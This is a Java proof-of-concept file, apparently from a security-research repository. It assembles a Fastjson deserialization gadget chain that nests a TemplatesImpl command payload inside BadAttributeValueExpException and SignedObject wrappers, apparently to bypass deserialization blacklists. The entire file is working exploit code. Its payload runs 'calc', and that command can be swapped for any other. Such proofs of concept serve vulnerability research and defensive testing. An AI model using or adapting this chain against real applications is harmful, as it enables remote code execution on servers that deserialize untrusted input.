package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.security.SignedObject;
import java.util.HashMap;

public class BASignObjectRefbypassChain {
    public static void main(String[] args) throws Exception {
        Templates templatesImpl = SerializeUtils.getTemplate("calc");
        JSONObject jsonObject1 = new JSONObject();
        jsonObject1.put("pop1",templatesImpl);
        BadAttributeValueExpException badAttributeValueExpException1 = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException1,"val",jsonObject1);
        SignedObject signObject = SerializeUtils.getSignObject(badAttributeValueExpException1);
        JSONObject jsonObject2 = new JSONObject();
        jsonObject2.put("pop2",signObject);
        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(null);
        SerializeUtils.setFieldValue(badAttributeValueExpException2,"val",jsonObject2);
        HashMap<Object, Object> map = new HashMap<>();
        map.put(signObject,badAttributeValueExpException2);
        map.put(templatesImpl,badAttributeValueExpException1);
        SerializeUtils.deserTester(map);
    }
}
